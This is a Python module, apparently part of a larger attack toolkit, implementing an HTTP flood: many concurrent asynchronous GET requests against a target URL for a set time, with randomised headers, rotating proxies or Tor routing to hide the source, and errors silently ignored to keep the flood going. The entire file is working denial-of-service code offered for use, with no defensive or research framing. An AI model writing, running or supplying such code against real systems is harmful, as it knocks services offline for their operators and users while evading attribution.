import asyncio
import httpx
import random
from core.header_mutator import generate_headers
from core.proxy_rotator import load_proxies, get_random_proxy

class HTTPFlood:
    def __init__(
        self,
        target_url,
        concurrency=100,
        duration=30,
        timeout=10,
        use_proxy=False,
        proxy_file='config/proxies.txt',
        use_tor=False
    ):
        self.target_url = target_url
        self.concurrency = concurrency
        self.duration = duration
        self.timeout = timeout
        self.use_proxy = use_proxy
        self.use_tor = use_tor
        # تحميل البروكسيات من ملف إذا تم تفعيل الخيار
        self.proxies = load_proxies(proxy_file) if use_proxy else []
        self.stop = False

    async def attack(self):
        timeout = httpx.Timeout(self.timeout)
        limits = httpx.Limits(max_connections=self.concurrency)
        async with httpx.AsyncClient(http2=True, timeout=timeout, limits=limits) as client:
            tasks = [asyncio.create_task(self._worker(client)) for _ in range(self.concurrency)]
            await asyncio.gather(*tasks)

    async def _worker(self, client):
        end_time = asyncio.get_event_loop().time() + self.duration
        while not self.stop and asyncio.get_event_loop().time() < end_time:
            headers = generate_headers()
            proxy = None

            if self.use_tor:
                proxy = "socks5h://127.0.0.1:9050"
            elif self.use_proxy and self.proxies:
                proxy = get_random_proxy(self.proxies)

            try:
                await client.get(self.target_url, headers=headers, proxies=proxy)
            except Exception:
                pass  # تجاهل الأخطاء للحفاظ على الاستمرارية

    def stop_attack(self):
        self.stop = True
